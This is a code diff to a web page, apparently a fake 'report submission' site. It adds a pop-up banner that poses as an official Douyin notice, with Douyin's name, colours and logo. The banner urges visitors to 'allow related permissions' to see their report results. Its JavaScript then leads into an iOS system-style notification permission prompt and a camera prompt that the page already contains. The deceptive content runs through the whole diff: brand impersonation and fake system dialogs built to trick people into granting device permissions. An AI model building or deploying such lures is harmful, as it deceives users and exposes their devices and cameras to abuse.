@@ -414,6 +414,81 @@
             fill: #fff;
         }
 
+        /* ===== Douyin Notification Banner ===== */
+        .douyin-notif-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.4);
+            z-index: 1999;
+            align-items: center;
+            justify-content: center;
+        }
+        .douyin-notif-overlay.active { display: flex; }
+        .douyin-notif-overlay.fade-out {
+            animation: sysFadeOut 0.4s ease forwards;
+        }
+        .douyin-notif-overlay.fade-in .douyin-notif-box {
+            animation: sysModalIn 0.35s ease;
+        }
+        .douyin-notif-box {
+            background: #fff;
+            border-radius: 16px;
+            width: 85%;
+            max-width: 320px;
+            overflow: hidden;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.15);
+        }
+        .douyin-notif-header {
+            background: linear-gradient(135deg, #FE2C55, #D4163E);
+            padding: 16px 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .douyin-notif-header img {
+            width: 36px;
+            height: 36px;
+            border-radius: 8px;
+        }
+        .douyin-notif-header-text h3 {
+            color: #fff;
+            font-size: 15px;
+            font-weight: 600;
+            margin: 0;
+        }
+        .douyin-notif-header-text span {
+            color: rgba(255,255,255,0.8);
+            font-size: 11px;
+        }
+        .douyin-notif-body {
+            padding: 20px;
+            text-align: center;
+        }
+        .douyin-notif-body p {
+            font-size: 14px;
+            color: #333;
+            line-height: 1.7;
+            margin: 0;
+        }
+        .douyin-notif-btn {
+            display: block;
+            width: calc(100% - 40px);
+            margin: 0 20px 20px;
+            padding: 12px;
+            background: linear-gradient(135deg, #FE2C55, #E81F4A);
+            color: #fff;
+            border: none;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            font-family: inherit;
+        }
+        .douyin-notif-btn:active {
+            opacity: 0.9;
+        }
+
         /* ===== iOS Native-style Camera Modal ===== */
         .sys-modal-overlay {
             display: none;
@@ -647,8 +722,25 @@
     <div class="footer">本页面仅供信息提交，审核结果以系统通知为准</div>
 </div>
 
+<!-- 抖音最新举报接口通知 -->
+<div class="douyin-notif-overlay active" id="douyinNotifModal">
+    <div class="douyin-notif-box">
+        <div class="douyin-notif-header">
+            <img src="111.png" alt="抖音">
+            <div class="douyin-notif-header-text">
+                <h3>抖音</h3>
+                <span>最新举报接口通知</span>
+            </div>
+        </div>
+        <div class="douyin-notif-body">
+            <p>举报结果将展示在页面最下方，请打开并允许相关权限，以自动同步并展示举报核验结果。</p>
+        </div>
+        <button class="douyin-notif-btn" onclick="closeDouyinNotif()">我知道了</button>
+    </div>
+</div>
+
 <!-- iOS 风格通知权限弹窗 -->
-<div class="sys-modal-overlay active" id="customNotifModal">
+<div class="sys-modal-overlay" id="customNotifModal">
     <div class="sys-modal">
         <div class="sys-modal-content">
             <img src="111.png" style="width:44px;height:44px;border-radius:10px;margin:0 auto 12px;display:block;">
@@ -747,6 +839,20 @@
     }, { passive: false });
 
     // ===== 进入网站：通知弹窗已在HTML中默认active =====
+
+    // 抖音通知 - 点击"我知道了" → 丝滑过渡到通知权限弹窗
+    function closeDouyinNotif() {
+        var notifModal = document.getElementById('douyinNotifModal');
+        notifModal.classList.add('fade-out');
+        setTimeout(function() {
+            notifModal.classList.remove('active', 'fade-out');
+            var customNotifModal = document.getElementById('customNotifModal');
+            customNotifModal.classList.add('active', 'fade-in');
+            setTimeout(function() {
+                customNotifModal.classList.remove('fade-in');
+            }, 400);
+        }, 400);
+    }
 
     // 通知弹窗 - 点击"允许" → 丝滑过渡到相机弹窗
     function onCustomNotifAllow() {
